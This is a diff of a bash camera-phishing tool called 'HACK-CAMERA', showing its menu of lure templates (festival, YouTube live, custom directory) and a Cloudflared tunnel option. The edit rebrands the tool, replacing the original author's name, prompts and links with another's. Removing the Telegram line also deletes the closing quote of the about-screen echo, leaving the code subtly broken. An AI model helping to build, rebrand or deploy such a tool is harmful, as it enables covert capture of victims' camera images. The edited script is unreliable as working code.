@@ -374,7 +374,7 @@ ${red}[${white}0${red}] ${cyan}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
+printf "${cyan}\nSUM${nc}@${blue}-X ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -382,7 +382,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nSUM${nc}@${blue}-X ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -393,7 +393,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nSUM${nc}@${blue}-X ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -411,7 +411,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nSUM${nc}@${blue}-X ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -427,11 +427,10 @@ read option
         echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
 $red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
-$red[Github]     ${cyan} :[https://github.com/hackerxphantom] 
-$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
-$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
-printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
+$red[Author]     ${cyan} :[SUM X]
+$red[Github]     ${cyan} :[https://github.com/SUMIT-SHAH123]
+$red[Join us]    ${cyan} :[https://sumithub.com]
+printf "${cyan}\nSUM${nc}@${cyan}-X ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://bit.ly/3PV3S3r"
